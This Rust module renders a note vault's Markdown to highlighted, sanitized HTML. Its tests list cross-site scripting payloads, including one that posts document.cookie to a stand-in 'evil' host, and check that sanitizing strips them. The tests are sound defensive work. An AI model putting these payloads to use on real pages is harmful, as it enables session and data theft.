//! Markdown and syntax-highlight rendering helpers.
//!
//! Carved out of the parent `api` module for file-size hygiene.

use super::*;

pub(super) fn normalize_lumis_line_html(html: &str) -> String {
    html.replace("\r\n</div>", "</div>")
        .replace("\n</div>", "</div>")
}

pub(super) fn render_markdown_html(
    markdown: &str,
    base_folder: Option<&str>,
    theme_preference: Option<&str>,
) -> Result<String, ApiError> {
    use pulldown_cmark::{CodeBlockKind, CowStr, Event, Options, Parser, Tag, TagEnd};

    let mut options = Options::empty();
    options.insert(Options::ENABLE_TABLES);
    options.insert(Options::ENABLE_FOOTNOTES);
    options.insert(Options::ENABLE_STRIKETHROUGH);
    options.insert(Options::ENABLE_TASKLISTS);

    let mut events = Vec::new();
    let mut parser = Parser::new_ext(markdown, options);

    while let Some(event) = parser.next() {
        match event {
            Event::Start(Tag::CodeBlock(kind)) => {
                let language_hint = match kind {
                    CodeBlockKind::Fenced(language) => Some(language.to_string()),
                    CodeBlockKind::Indented => None,
                };
                let mut code = String::new();
                for code_event in parser.by_ref() {
                    match code_event {
                        Event::End(TagEnd::CodeBlock) => break,
                        Event::Text(text) => code.push_str(&text),
                        Event::Code(text) => code.push_str(&text),
                        Event::SoftBreak | Event::HardBreak => code.push('\n'),
                        _ => {}
                    }
                }
                events.push(Event::Html(CowStr::Boxed(
                    render_code_block_html(&code, language_hint.as_deref(), theme_preference)?
                        .into_boxed_str(),
                )));
            }
            Event::Start(Tag::Image {
                link_type,
                dest_url,
                title,
                id,
            }) => events.push(Event::Start(Tag::Image {
                link_type,
                dest_url: rewrite_markdown_svg_url(&dest_url, base_folder)
                    .map(CowStr::Boxed)
                    .unwrap_or(dest_url),
                title,
                id,
            })),
            other => events.push(other),
        }
    }

    let mut html = String::new();
    pulldown_cmark::html::push_html(&mut html, events.into_iter());
    Ok(sanitize_vault_html(&html))
}

/// Strip anything executable from Markdown-derived HTML.
///
/// A vault ingests external material — web clippings, email, transcripts — so
/// its Markdown is not trusted input. `pulldown_cmark` passes raw `Event::Html`
/// and `InlineHtml` through verbatim, and the SPA injects the result with
/// `innerHTML` from the same origin as the API, so an `<img src=x onerror=...>`
/// in any note could read every file in the vault and post to the write routes.
///
/// Formatting HTML that authors legitimately write (tables, `<br>`, `<sub>`)
/// survives; scripts, event handlers, and `javascript:` URLs do not.
pub(super) fn sanitize_vault_html(html: &str) -> String {
    use std::collections::HashSet;
    use std::sync::OnceLock;

    static CLEANER: OnceLock<ammonia::Builder<'static>> = OnceLock::new();
    CLEANER
        .get_or_init(|| {
            let mut builder = ammonia::Builder::default();
            // Syntax highlighting and heading anchors are emitted as classes
            // by our own renderer, so they have to survive the clean.
            builder
                .add_generic_attributes(["class"])
                .url_schemes(HashSet::from(["http", "https", "mailto", "data"]));
            builder
        })
        .clean(html)
        .to_string()
}

pub(super) fn rewrite_markdown_svg_url(
    dest_url: &str,
    base_folder: Option<&str>,
) -> Option<Box<str>> {
    if !is_local_markdown_url(dest_url) {
        return None;
    }

    let (path_part, query, fragment) = split_markdown_url(dest_url);
    if !path_part.to_ascii_lowercase().ends_with(".svg") {
        return None;
    }

    let vault_relative_path = normalize_markdown_asset_path(base_folder.unwrap_or(""), path_part)?;
    let mut rewritten = format!(
        "/api/file/raw?path={}",
        percent_encode_query_value(&vault_relative_path)
    );
    if let Some(query) = query {
        rewritten.push('&');
        rewritten.push_str(query);
    }
    if let Some(fragment) = fragment {
        rewritten.push('#');
        rewritten.push_str(fragment);
    }
    Some(rewritten.into_boxed_str())
}

pub(super) fn is_local_markdown_url(url: &str) -> bool {
    let trimmed = url.trim();
    if trimmed.starts_with('#') {
        return false;
    }
    let lower = trimmed.to_ascii_lowercase();
    if matches!(
        lower.split_once(':').map(|(scheme, _)| scheme),
        Some("http" | "https" | "data" | "mailto" | "tel" | "javascript")
    ) {
        return false;
    }
    true
}

pub(super) fn split_markdown_url(url: &str) -> (&str, Option<&str>, Option<&str>) {
    let without_fragment;
    let fragment;
    if let Some((head, tail)) = url.split_once('#') {
        without_fragment = head;
        fragment = Some(tail);
    } else {
        without_fragment = url;
        fragment = None;
    }

    if let Some((path, query)) = without_fragment.split_once('?') {
        (path, Some(query), fragment)
    } else {
        (without_fragment, None, fragment)
    }
}

pub(super) fn normalize_markdown_asset_path(base_folder: &str, path: &str) -> Option<String> {
    let path = path.trim().replace('\\', "/");
    let mut parts = Vec::new();

    if !path.starts_with('/') {
        for part in base_folder.split('/') {
            if !part.is_empty() {
                parts.push(part.to_owned());
            }
        }
    }

    for part in path.trim_start_matches('/').split('/') {
        match part {
            "" | "." => {}
            ".." => {
                parts.pop()?;
            }
            _ => parts.push(part.to_owned()),
        }
    }

    if parts.is_empty() {
        None
    } else {
        Some(parts.join("/"))
    }
}

pub(super) fn percent_encode_query_value(value: &str) -> String {
    let mut output = String::new();
    for byte in value.bytes() {
        if byte.is_ascii_alphanumeric() || matches!(byte, b'-' | b'.' | b'_' | b'~' | b'/') {
            output.push(byte as char);
        } else {
            output.push_str(&format!("%{byte:02X}"));
        }
    }
    output
}

pub(super) fn render_code_block_html(
    code: &str,
    language_hint: Option<&str>,
    theme_preference: Option<&str>,
) -> Result<String, ApiError> {
    let Some((_, language)) = highlight_language_hint(language_hint) else {
        let class = language_hint
            .filter(|language| !language.trim().is_empty())
            .map(|language| format!(" class=\"language-{}\"", escape_html_attr(language.trim())))
            .unwrap_or_default();
        return Ok(format!(
            "<pre class=\"highlight-preview\"><code{class}>{}</code></pre>",
            escape_html(code)
        ));
    };

    highlight_to_html(code, language, theme_preference)
}

/// Render `code` to highlighted HTML with the preview theme/formatting shared by
/// the code-block renderer and the file-highlight endpoint.
pub(super) fn highlight_to_html(
    code: &str,
    language: lumis::languages::Language,
    theme_preference: Option<&str>,
) -> Result<String, ApiError> {
    let theme = lumis::themes::get(highlight_theme(theme_preference))
        .map_err(|source| ApiError::from(anyhow::anyhow!(source)))?;
    let formatter = lumis::HtmlInlineBuilder::new()
        .language(language)
        .theme(Some(theme))
        .pre_class(Some("highlight-preview".to_owned()))
        .build()
        .map_err(|source| ApiError::from(anyhow::anyhow!(source)))?;
    Ok(normalize_lumis_line_html(&lumis::highlight(
        code.trim_end_matches(['\r', '\n']),
        formatter,
    )))
}

pub(super) fn escape_html(value: &str) -> String {
    value
        .replace('&', "&amp;")
        .replace('<', "&lt;")
        .replace('>', "&gt;")
}

pub(super) fn escape_html_attr(value: &str) -> String {
    escape_html(value).replace('"', "&quot;")
}

pub(super) fn highlight_theme(theme_preference: Option<&str>) -> &'static str {
    match theme_preference {
        Some("light") => "catppuccin_latte",
        _ => "catppuccin_mocha",
    }
}

pub(super) fn highlight_language_hint(
    language_hint: Option<&str>,
) -> Option<(&'static str, lumis::languages::Language)> {
    let language = language_hint?.split_whitespace().next()?.trim();
    highlight_language_name(Some(language))
}

pub(super) fn highlight_language_name(
    name: Option<&str>,
) -> Option<(&'static str, lumis::languages::Language)> {
    match name.map(str::to_ascii_lowercase).as_deref() {
        Some("c") | Some("h") => Some(("c", lumis::languages::Language::C)),
        Some("cc") | Some("cpp") | Some("cxx") | Some("c++") | Some("hpp") | Some("hxx") => {
            Some(("cpp", lumis::languages::Language::CPlusPlus))
        }
        Some("hs") | Some("haskell") => Some(("haskell", lumis::languages::Language::Haskell)),
        Some("json") => Some(("json", lumis::languages::Language::JSON)),
        Some("toml") => Some(("toml", lumis::languages::Language::Toml)),
        Some("md") | Some("markdown") => Some(("markdown", lumis::languages::Language::Markdown)),
        Some("rs") | Some("rust") => Some(("rust", lumis::languages::Language::Rust)),
        Some("ts") | Some("typescript") => {
            Some(("typescript", lumis::languages::Language::TypeScript))
        }
        Some("js") | Some("javascript") => {
            Some(("javascript", lumis::languages::Language::JavaScript))
        }
        Some("sh") | Some("bash") => Some(("bash", lumis::languages::Language::Bash)),
        Some("yaml") | Some("yml") => Some(("yaml", lumis::languages::Language::YAML)),
        Some("py") | Some("python") => Some(("python", lumis::languages::Language::Python)),
        _ => None,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Vault Markdown is untrusted: intake pulls in web clippings, email and
    /// transcripts, and the SPA injects this HTML with `innerHTML` from the
    /// same origin as the API.
    #[test]
    fn executable_markup_does_not_survive_rendering() {
        let hostile = [
            "<img src=x onerror=\"fetch('//evil/'+document.cookie)\">",
            "<script>alert(1)</script>",
            "<svg onload=alert(1)>",
            "[click me](javascript:alert(1))",
            "<a href=\"javascript:alert(1)\">x</a>",
            "<iframe src=\"//evil\"></iframe>",
            "<body onload=alert(1)>",
        ];

        for markdown in hostile {
            let html = render_markdown_html(markdown, None, None).unwrap();
            let lowered = html.to_lowercase();
            for banned in ["onerror", "onload", "<script", "javascript:", "<iframe"] {
                assert!(
                    !lowered.contains(banned),
                    "`{banned}` survived rendering of `{markdown}` -> {html}"
                );
            }
        }
    }

    #[test]
    fn ordinary_formatting_still_renders() {
        let html = render_markdown_html(
            "# Title\n\nSome **bold** text and a [link](https://example.com).\n\n\
             | a | b |\n| - | - |\n| 1 | 2 |\n",
            None,
            None,
        )
        .unwrap();

        for expected in ["<h1", "<strong>", "https://example.com", "<table>"] {
            assert!(html.contains(expected), "`{expected}` missing from {html}");
        }
    }

    #[test]
    fn highlighted_code_keeps_its_classes() {
        // Sanitizing must not strip the spans our own highlighter emits.
        let html = render_markdown_html("```rust\nfn main() {}\n```\n", None, None).unwrap();
        assert!(
            html.contains("class="),
            "highlight classes stripped: {html}"
        );
    }
}
